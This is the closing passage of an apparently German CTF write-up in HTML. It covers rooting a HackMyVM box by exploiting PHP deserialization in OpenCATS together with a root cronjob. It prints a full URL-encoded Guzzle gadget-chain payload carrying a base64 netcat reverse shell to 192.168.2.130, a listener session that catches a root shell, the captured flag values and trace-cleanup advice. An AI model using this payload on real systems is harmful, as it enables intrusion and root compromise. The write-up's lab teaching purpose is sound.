+            <p class="analysis"><strong>Analyse:</strong> Dies ist der entscheidende Schritt zur Auslösung der Deserialisierungs-Schwachstelle. Der mit `phpggc` generierte, URL-kodierte Payload wird als Wert des GET-Parameters `parametersactivity:ActivityDataGrid` an die URL `http://thisisnotcatitisopencats.kitty.hmv/index.php?m=activity` gesendet. Dies geschieht typischerweise durch Aufrufen dieser URL in einem Webbrowser oder mit einem Tool wie `curl`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wenn die OpenCATS-Instanz auf dieser Seite den Parameter `parametersactivity:ActivityDataGrid` entgegennimmt und dessen Wert unsicher deserialisiert, wird der Guzzle-Gadget-Chain-Exploit ausgelöst. Dies führt dazu, dass der Inhalt von `/tmp/newfile.txt` (der Base64-kodierte Reverse-Shell-Befehl) in die Datei `/usr/local/etc/newfile.txt` geschrieben wird. Kurz darauf (innerhalb einer Minute) wird der Cronjob diese Datei verarbeiten, den Base64-Code extrahieren, dekodieren und als Root ausführen, was die Reverse Shell zum lauschenden Netcat-Listener sendet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie diesen Request aus (im Browser oder mit `curl`). Beobachten Sie den Netcat-Listener auf Port 9001 auf dem Angreifer-System. Wenn eine Verbindung eingeht, überprüfen Sie mit `id`, ob Sie Root-Rechte haben.
+            <br><strong>Empfehlung (Admin):</strong> (Siehe Empfehlungen zur PHP-Deserialisierung und zum Cronjob) Untersuchen und patchen Sie die OpenCATS-Anwendung auf Deserialisierungs-Schwachstellen. Überprüfen Sie alle Eingabeparameter auf sichere Verarbeitung. Protokollieren und überwachen Sie Webserver-Anfragen auf verdächtige Payloads.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">Browser Request / Payload Injection:</span>
+<span class="command">http://thisisnotcatitisopencats.kitty.hmv/index.php?m=activity¶metersactivity:ActivityDataGrid=</span>a%3A2%3A%7Bi%3A7%3B%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3B%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A49%3A%22bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMzAgTAwMQo%3D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A26%3A%22%2Fusr%2Flocal%2Fetc%2Fnewfile.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="poc">
+           <h2>Proof of Concept (Root Exploit)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener, der auf Port 9001 auf dem Angreifer-System (192.168.2.130) lauscht, empfängt eine eingehende Verbindung vom Zielsystem (192.168.2.129). Der Befehl `id` wird in der erhaltenen Shell ausgeführt, gefolgt von `cat`-Befehlen zum Auslesen der User- und Root-Flags.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Fantastisch, der Root-Zugriff war erfolgreich! Nun haben wir unser Ziel erreicht!</span> Die Ausgabe `uid=0(root) gid=0(root) groups=0(root)` bestätigt eindeutig, dass die erhaltene Shell Root-Rechte besitzt. Die Kombination aus der PHP-Deserialisierungsschwachstelle in OpenCATS (ausgelöst durch den Browser-Request) und dem unsicheren Cronjob hat funktioniert. Der Payload wurde erfolgreich in `/usr/local/etc/newfile.txt` geschrieben, vom Cronjob verarbeitet und die Reverse Shell als Root gestartet. Die User-Flag (`3702...`) und die Root-Flag (`3f79...`) werden erfolgreich ausgelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Dokumentieren Sie den erfolgreichen Exploit-Pfad (Deserialisierung -> Cronjob -> Root-Shell).</li><li>Notieren Sie die Root-Flag.</li><li>Stabilisieren Sie die Shell bei Bedarf (z.B. `python3 -c 'import pty; pty.spawn("/bin/bash")'`).</li><li>Führen Sie abschließende Enumeration als Root durch, falls erforderlich (z.B. Überprüfung von Shadow-Passwörtern, versteckten Verzeichnissen).</li><li>Bereinigen Sie hochgeladene Dateien (`/tmp/newfile.txt`, `/tmp/pspy64`, `/tmp/exploit-*`) und ggf. die Datei `/usr/local/etc/newfile.txt`, um Spuren zu minimieren.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Beheben Sie dringend die zugrundeliegenden Schwachstellen:</li><li>Entfernen oder sichern Sie den gefährlichen Cronjob in `/etc/crontab`.</li><li>Patchen Sie die OpenCATS-Anwendung gegen die Deserialisierungs-Schwachstelle oder entfernen Sie sie, falls nicht benötigt.</li><li>Überprüfen Sie das gesamte System auf weitere Fehlkonfigurationen oder Schwachstellen.</li><li>Ändern Sie alle potenziell kompromittierten Passwörter (insbesondere Root).</li><li>Analysieren Sie die Logs, um den Angriffszeitpunkt und mögliche weitere Aktionen des Angreifers nachzuvollziehen.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.130] from (UNKNOWN) [192.168.2.129] 48834</span>
+<span class="prompt"># </span><span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="prompt"># </span><span class="command">cat /home/dyutidhara/user.txt</span>
+<span class="password">3702f4d1247163b61b1cd8b368539cbf</span>
+<span class="prompt"># </span><span class="command">cat root.txt</span>
+<span class="password">3f798f4e70a832c64e8f6f1462b04d0f</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/dyutidhara/user.txt</div>
+                     <div class="flag-value"><span class="password">3702f4d1247163b61b1cd8b368539cbf</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <span class="comment">(Pfad angenommen, da nur 'cat root.txt' gezeigt wurde)</span>
+                     <div class="flag-value"><span class="password">3f798f4e70a832c64e8f6f1462b04d0f</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. April 2023</p>
+    </footer>
+</body>
+</html>
